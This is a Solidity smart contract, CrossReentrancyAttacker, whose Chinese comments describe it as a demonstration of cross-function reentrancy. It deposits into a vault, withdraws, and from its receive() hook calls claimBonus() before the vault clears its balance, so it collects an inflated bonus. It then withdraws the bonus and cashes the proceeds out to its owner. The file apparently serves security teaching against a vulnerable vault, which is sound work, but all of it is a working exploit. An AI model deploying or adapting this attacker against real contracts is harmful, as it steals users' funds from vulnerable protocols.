// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

interface ICrossReentrancyVault {
    function deposit() external payable;
    function withdraw() external;
    function claimBonus() external;
    function withdrawBonus() external;  
}

/**
 * @title CrossReentrancyAttacker
 * @notice 演示跨函数重入攻击
 * @dev withdraw() 转账时触发 receive() → 在 receive() 中调用 claimBonus()
 *      → claimBonus() 读到的 balances 还是旧值 → 多领奖金
 */
contract CrossReentrancyAttacker {
    ICrossReentrancyVault public immutable vault;
    address public immutable owner;
    uint256 public bonusClaimed; // 记录异常奖金

    constructor(address _vault) {
        vault = ICrossReentrancyVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value >= 1 ether, "Need at least 1 ether");

        // Step 1: 存款
        vault.deposit{value: msg.value}();

        // Step 2: 取款（会触发 receive → claimBonus 跨函数重入）
        vault.withdraw();
    }

    receive() external payable {
        // 拿到取款后，立即调用 claimBonus（跨函数重入！）
        if (!_hasClaimedBonus) {
            _hasClaimedBonus = true;
            // 此时 withdraw 还没把 balances[attacker] 清零
            // 所以 claimBonus 会读到旧余额，多给 10% 奖金
            vault.claimBonus();
        }
    }

    // 标记是否已经在本次攻击中领过奖金
    bool private _hasClaimedBonus;

    function collectBonus() external {
        require(msg.sender == owner, "Not owner");
        vault.withdrawBonus();
    }

    function cashOut() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value:address(this).balance}("");
        require(success, "cash out failed");
    }

    fallback() external payable {}
}